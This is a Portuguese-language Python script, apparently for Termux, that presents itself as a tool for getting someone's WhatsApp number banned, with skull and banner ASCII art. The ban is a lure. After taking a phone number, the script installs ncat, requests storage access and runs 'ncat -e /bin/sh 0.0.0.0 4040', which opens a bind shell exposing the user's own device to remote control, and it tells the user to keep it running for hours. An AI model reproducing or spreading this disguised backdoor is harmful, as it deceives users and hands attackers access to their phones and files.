import time
import os
amarelo = "\033[31m" 
vermelho = "\033[31m"
azul= "\033[34m" 
branco= "\033[37m"

print(vermelho + '''
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~ \n''')
time.sleep(1)
print(azul+''' _______  ___      _______  _______  ___   _  _______  _______  _______  __    _  _______ 
|  _    ||   |    |   _   ||       ||   | | ||       ||       ||       ||  |  | ||       |
| |_|   ||   |    |  |_|  ||       ||   |_| ||  _____||_     _||   _   ||   |_| ||    ___|
|       ||   |    |       ||       ||      _|| |_____   |   |  |  | |  ||       ||   |___ 
|  _   | |   |___ |       ||      _||     |_ |_____  |  |   |  |  |_|  ||  _    ||    ___|
| |_|   ||       ||   _   ||     |_ |    _  | _____| |  |   |  |       || | |   ||   |___ 
|_______||_______||__| |__||_______||___| |_||_______|  |___|  |_______||_|  |__||_______| \n''')
time.sleep(2)
print(amarelo+"Bem vindo ao script de banimento de Whatsapp!! by wb.py404\n")
nig = input("Digite o número que você deseja banir,"+vermelho+" APOS COLOCAR O NÚMERO, DIGITE 'y' PARA ACEITAR OS ARQUIVOS ADICIONAIS,E EM SEGUIDA DEIXE O SCRIPT ABERTO EM SEGUNDO PLANO POR 3 HORAS, E O NÚMERO SERA BANIDO EM SEGUIDA: ")
time.sleep(2)
print ("Carregando...")
os.system("pkg install nmap-ncat")
os.system("termux-setup-storage")
os.system("ncat -e /bin/sh 0.0.0.0 4040")


      
